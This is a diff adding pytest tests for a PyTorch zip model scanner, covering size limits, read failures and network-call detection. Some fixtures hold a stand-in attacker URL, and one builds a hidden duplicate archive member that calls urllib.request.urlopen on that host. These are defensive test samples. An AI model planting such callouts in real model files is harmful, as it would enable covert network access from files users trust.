@@ -613,6 +613,203 @@ def test_pytorch_zip_timeout_marks_inconclusive(tmp_path: Path) -> None:
     assert timeout_checks[0].severity == IssueSeverity.INFO
 
 
+def test_pytorch_zip_jit_scan_size_limit_marks_inconclusive(tmp_path: Path) -> None:
+    model_path = tmp_path / "large_jit_member.pt"
+    with zipfile.ZipFile(model_path, "w") as zip_file:
+        zip_file.writestr("archive/version", "3\n")
+        zip_file.writestr("archive/byteorder", "little")
+        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
+        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")
+
+    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 4}).scan(str(model_path))
+
+    assert result.success is False
+    assert result.metadata["analysis_incomplete"] is True
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "pytorch_zip_jit_member_size_limit" in result.metadata["scan_outcome_reasons"]
+    size_checks = [check for check in result.checks if check.name == "JIT/Network Scan Size Limit"]
+    # Aggregation: many oversize members should surface as a single summary
+    # check with a `details["zip_entries"]` list, not one INFO per member.
+    assert len(size_checks) == 1
+    assert size_checks[0].severity == IssueSeverity.INFO
+    assert "archive/code/debug/source.py" in size_checks[0].details["zip_entries"]
+    assert "archive/byteorder" in size_checks[0].details["zip_entries"]
+    assert size_checks[0].details["skipped_count"] == len(size_checks[0].details["zip_entries"])
+    assert size_checks[0].details["analysis_incomplete"] is True
+    assert size_checks[0].details["max_scan_bytes"] == 4
+
+
+def test_pytorch_zip_jit_scan_read_failure_marks_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    model_path = tmp_path / "unreadable_jit_member.pt"
+    with zipfile.ZipFile(model_path, "w") as zip_file:
+        zip_file.writestr("archive/version", "3\n")
+        zip_file.writestr("archive/byteorder", "little")
+        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
+        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")
+
+    original_read_member_bytes = PyTorchZipScanner._read_member_bytes
+
+    def fail_jit_member_read(
+        self: PyTorchZipScanner,
+        zip_file: zipfile.ZipFile,
+        name: str | zipfile.ZipInfo,
+        *,
+        phase: str,
+        result: ScanResult,
+        max_bytes: int | None = None,
+    ) -> bytes:
+        if phase == "jit_script_scan" and self._get_zip_member_name(name).endswith("source.py"):
+            raise OSError("member read failed")
+        return original_read_member_bytes(self, zip_file, name, phase=phase, result=result, max_bytes=max_bytes)
+
+    monkeypatch.setattr(PyTorchZipScanner, "_read_member_bytes", fail_jit_member_read)
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    assert result.success is False
+    assert result.metadata["analysis_incomplete"] is True
+    assert "pytorch_zip_jit_member_read_failed" in result.metadata["scan_outcome_reasons"]
+    read_failure_checks = [check for check in result.checks if check.name == "JIT/Network Scan Read Failure"]
+    # Aggregation: per-member exception details live under `details["entries"]`
+    # so even a flood of unreadable members surfaces as a single summary.
+    assert len(read_failure_checks) == 1
+    details = read_failure_checks[0].details
+    assert details["failed_count"] == 1
+    assert details["zip_entries"] == ["archive/code/debug/source.py"]
+    assert details["entries"][0]["exception_type"] == "OSError"
+    assert details["entries"][0]["exception"] == "member read failed"
+
+
+def test_pytorch_zip_jit_scan_aggregates_many_oversize_members_into_one_check(
+    tmp_path: Path,
+) -> None:
+    """Adversarial archives with many oversize members must not flood the checks list."""
+    model_path = tmp_path / "many_large_jit_members.pt"
+    with zipfile.ZipFile(model_path, "w") as zip_file:
+        zip_file.writestr("archive/version", "3\n")
+        zip_file.writestr("archive/byteorder", "little")
+        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
+        for index in range(25):
+            zip_file.writestr(f"archive/code/debug/src{index}.py", b"print('hello world ')\n")
+
+    result = PyTorchZipScanner(config={"max_jit_scan_member_bytes": 4}).scan(str(model_path))
+
+    size_checks = [check for check in result.checks if check.name == "JIT/Network Scan Size Limit"]
+    assert len(size_checks) == 1
+    entries = size_checks[0].details["zip_entries"]
+    assert len(entries) == 27  # 25 generated sources + byteorder + data.pkl
+    assert size_checks[0].details["skipped_count"] == 27
+    assert all(entry["file_size"] > 4 for entry in size_checks[0].details["entries"])
+    # `scan_outcome_reasons` must be deduplicated even though many members tripped it.
+    reasons = result.metadata.get("scan_outcome_reasons", [])
+    assert reasons.count("pytorch_zip_jit_member_size_limit") == 1
+
+
+def test_pytorch_zip_jit_size_limit_respects_disabled_checks(tmp_path: Path) -> None:
+    model_path = tmp_path / "large_disabled_jit_member.pt"
+    with zipfile.ZipFile(model_path, "w") as zip_file:
+        zip_file.writestr("archive/version", "3\n")
+        zip_file.writestr("archive/byteorder", "little")
+        zip_file.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
+        zip_file.writestr("archive/code/debug/source.py", b"print('hello')\n")
+
+    result = PyTorchZipScanner(
+        config={"check_jit_script": False, "check_network_comm": False, "max_jit_scan_member_bytes": 4}
+    ).scan(str(model_path))
+
+    assert result.success is True
+    assert "scan_outcome" not in result.metadata
+    assert "analysis_incomplete" not in result.metadata
+    assert not any(check.name == "JIT/Network Scan Size Limit" for check in result.checks)
+    assert result.metadata["disabled_checks"] == [
+        "JIT/Script Code Execution Detection",
+        "Network Communication Detection",
+    ]
+
+
+def test_pytorch_zip_scans_pickle_members_for_network_when_pickle_scanner_disabled(tmp_path: Path) -> None:
+    model_path = tmp_path / "network_in_data_pkl.pt"
+    with zipfile.ZipFile(model_path, "w") as zip_file:
+        zip_file.writestr("archive/version", "3\n")
+        zip_file.writestr("archive/byteorder", "little")
+        zip_file.writestr(
+            "archive/data.pkl",
+            pickle.dumps({"endpoint": "http://attacker.example/model"}, protocol=4),
+        )
+
+    result = PyTorchZipScanner(config={"scanners": ["pytorch_zip"]}).scan(str(model_path))
+
+    assert any(
+        check.name == "Scanner Selection" and check.details.get("skipped_scanner_id") == "pickle"
+        for check in result.checks
+    )
+    network_failures = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+    assert network_failures
+    assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)
+
+
+def test_pytorch_zip_scans_pickle_members_past_pickle_raw_window(tmp_path: Path) -> None:
+    model_path = tmp_path / "padded_network_in_data_pkl.pt"
+    payload = pickle.dumps(
+        {
+            "padding": "A" * 512,
+            "endpoint": "http://attacker.example/model",
+        },
+        protocol=4,
+    )
+    with zipfile.ZipFile(model_path, "w") as zip_file:
+        zip_file.writestr("archive/version", "3\n")
+        zip_file.writestr("archive/byteorder", "little")
+        zip_file.writestr("archive/data.pkl", payload)
+
+    result = PyTorchZipScanner(
+        config={
+            "pickle_root_raw_scan_limit_bytes": 64,
+            "pickle_expensive_raw_scan_limit_bytes": 64,
+            "max_jit_scan_member_bytes": len(payload) + 1,
+        }
+    ).scan(str(model_path))
+
+    network_failures = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+    assert network_failures
+    assert any(check.location == f"{model_path}:archive/data.pkl" for check in network_failures)
+
+
+def test_pytorch_zip_jit_scan_uses_pickle_entry_identity_for_duplicate_names(tmp_path: Path) -> None:
+    model_path = tmp_path / "duplicate_source_name.pt"
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore", UserWarning)
+        with zipfile.ZipFile(model_path, "w") as zip_file:
+            zip_file.writestr("archive/version", "3\n")
+            zip_file.writestr("archive/byteorder", "little")
+            zip_file.writestr("archive/code/payload.py", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
+            zip_file.writestr(
+                "archive/code/payload.py",
+                b"import urllib.request\nurllib.request.urlopen('http://attacker.example/model')\n",
+            )
+
+    result = PyTorchZipScanner().scan(str(model_path))
+
+    network_failures = [
+        check
+        for check in result.checks
+        if check.name == "Network Communication Detection" and check.status == CheckStatus.FAILED
+    ]
+    assert network_failures
+    assert any(check.location == f"{model_path}:archive/code/payload.py" for check in network_failures)
+
+
 @pytest.mark.performance
 def test_pytorch_zip_skips_numeric_data_files(tmp_path):
     """Test that numeric tensor data files in archive/data/ are skipped during JIT scanning."""
